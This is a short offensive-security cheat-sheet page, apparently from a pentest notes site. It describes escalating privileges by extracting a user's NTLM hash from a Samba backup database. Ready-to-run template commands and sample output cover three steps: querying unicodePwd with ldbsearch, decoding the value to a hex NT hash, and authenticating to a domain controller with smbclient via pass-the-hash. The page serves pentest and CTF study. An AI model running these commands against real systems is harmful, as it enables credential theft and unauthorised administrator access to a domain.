---
title: "Samba"
date: 2025-7-31
tags: ["Samba", "Kerberos", "Backup", "Linux", "SMB", "ldb", "Pass-The-Hash", "Restore", "Database"]
---

### Priesc #1: Retrieve NTLM from Samba Backup

{{< tab set1 tab1 >}}ldbsearch{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Query 'unicodepwd' of Target User

```console
ldbsearch -H sam.ldb '(samaccountname=<USER>)' 'unicodepwd'
```

```console {class="sample-code"}
$ ldbsearch -H sam.ldb '(samaccountname=Administrator)' 'unicodepwd'
# record 1
dn: CN=Administrator,CN=Users,DC=example,DC=com
unicodePwd:: iEb36u6PsRetBr3YMLdYbA==

# Referral
ref: ldap:///CN=Configuration,DC=example,DC=com

# Referral
ref: ldap:///DC=DomainDnsZones,DC=example,DC=com

# Referral
ref: ldap:///DC=ForestDnsZones,DC=example,DC=com

# returned 4 records
# 1 entries
# 3 referrals
```

#### 2. Convert to Hex

```console
echo -n '<UNICODEPWD>' | base64 -d | xxd -p   
```

```console {class="sample-code"}
$ echo -n 'iEb36u6PsRetBr3YMLdYbA==' | base64 -d | xxd -p   
8846f7eaee8fb117ad06bdd830b7586c
```

#### 3. Pass-The-Hash

```console
smbclient -L \\\\<TARGET>\\ -U '<DOMAIN>/<USER>%<HASH>' --pw-nt-hash
```

```console {class="sample-code"}
$ smbclient -L \\\\dc.example.com\\ -U 'example.com/Administrator%8846f7eaee8fb117ad06bdd830b7586c' --pw-nt-hash
gensec_gse_client_prepare_ccache: Kinit for Administrator@EXAMPLE.COM to access cifs/dc.example.com failed: Preauthentication failed: NT_STATUS_LOGON_FAILURE

        Sharename       Type      Comment
        ---------       ----      -------
        sysvol          Disk      
        netlogon        Disk      
        home            Disk      Home Directories
        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server dc.example.com (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

{{< /tabcontent >}}